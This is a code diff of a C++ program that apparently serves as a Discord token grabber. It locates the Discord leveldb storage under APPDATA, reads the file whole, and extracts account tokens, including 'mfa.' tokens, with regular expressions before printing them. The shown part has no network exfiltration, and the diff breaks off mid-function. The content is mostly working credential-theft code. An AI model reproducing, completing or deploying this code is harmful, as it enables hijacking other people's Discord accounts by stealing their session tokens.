@@ -1,42 +1,47 @@
 #include <iostream>
 #include <fstream>
-#include <regex>    
+#include <regex> 
 
 using namespace std;
     size_t sz = 0;
     char* szBuf;    
-    errno_t environment = _dupenv_s(&szBuf, &sz, "APPDATA");
+    errno_t Environment = _dupenv_s(&szBuf, &sz, "APPDATA");
     string AppData = szBuf;
-    string leveldb = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
-    string token = "[oken";
-    string line;
+    string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
+    string Token = "[oken";
+    string Content;
+
+string readAllText(const char* filename)
+{
+  FILE* fp;
+  fopen_s(&fp, filename, "rb");
+  if (fp) {
+     fseek(fp, 0, SEEK_END);
+     Content.resize(ftell(fp));
+     rewind(fp);
+     fread(&Content[0], 1, Content.size(), fp);
+     fclose(fp);
+     return(Content);
+  } 
+}
 
 int main()
 {
     smatch smatch;
     try {
-        ifstream file(leveldb);
-
-        if (file.is_open()) {
-            if (getline(file, line)) {
-                cout << line << '\n';
-                if (line.find(token, 0) != string::npos) {
-                    cout << token << '\n';
-                    regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
-                    if (regex_search(line, smatch, x) == true) {
-                        cout << smatch.str() << '\n';
-                    } else {
-                        regex y(R"(mfa\.[\w-]{84})");
-                        if (regex_search(line, smatch, y) == true) {
-                            cout << smatch.str() << '\n';
-                        } else {
-                            cout << "[REGEX] Not Found" << '\n';
-                        }
-                    }
-                } else{
-                    cout << "[TOKEN] Not Found" << '\n';
-                }
-            } file.close();
+        string data = readAllText(levelDB.c_str());
+        if (data.find(Token, 0) != string::npos) {
+           regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
+           if (regex_search(data, smatch, x) == true) {
+               cout << smatch.str() << '\n';
+           } else {
+               regex y(R"(mfa\.[\w-]{84})");
+               if (regex_search(data, smatch, y) == true) {
+                  cout << smatch.str() << '\n';
+               } else {
+                  cout << "[REGEX] Not Found" << '\n';
+               }
+           }
         }
         else {
             return 0;
